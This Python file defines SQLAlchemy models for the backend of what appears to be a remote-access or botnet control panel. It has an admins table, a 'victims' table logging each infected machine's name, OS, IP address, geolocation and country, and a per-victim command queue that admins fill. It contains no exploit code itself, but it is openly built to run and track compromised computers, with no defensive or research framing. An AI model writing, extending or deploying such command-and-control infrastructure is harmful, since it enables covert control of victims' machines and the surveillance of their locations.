from sqlalchemy import Boolean, Column, Integer, String, Float

from server.database import Base


class Admin_DB(Base):
    __tablename__ = "admins"
    id_admin = Column(Integer, primary_key=True, index=True)
    admin_login = Column(String, nullable=False)
    admin_hash_password = Column(String, nullable=False)
    is_super_admin = Column(Boolean, default=False)
    is_active = Column(Boolean, default=True)
    who_create = Column(String, default=None)
    salt = Column(String, nullable=False)


class Victim_DB(Base):
    __tablename__ = "victims"
    id_victim = Column(Integer, autoincrement=True, primary_key=True, index=True)
    pc_name = Column(String)
    last_login_date = Column(String)
    last_login_time = Column(Float)
    id_admin = Column(Integer, nullable=False)
    os_name = Column(String, default=None)
    geolocation = Column(String, default=None)
    country = Column(String, default=None)
    victim_ip = Column(String, default=None)
    victim_hash_id = Column(String, default=None)


class Command_DB(Base):
    __tablename__ = "commands"
    id_victim = Column(Integer, primary_key=True, nullable=False, unique=True)
    id_admin = Column(Integer, nullable=False,)
    command = Column(String, nullable=False)


if __name__ == '__main__':
    from sqlalchemy import create_engine
    from os import environ
    from config import start

    start()

    DATABASE_URL = environ.get("DB_URL")

    # TODO change echo value to True
    engine = create_engine(DATABASE_URL, echo="debug")
    Base.metadata.create_all(engine)
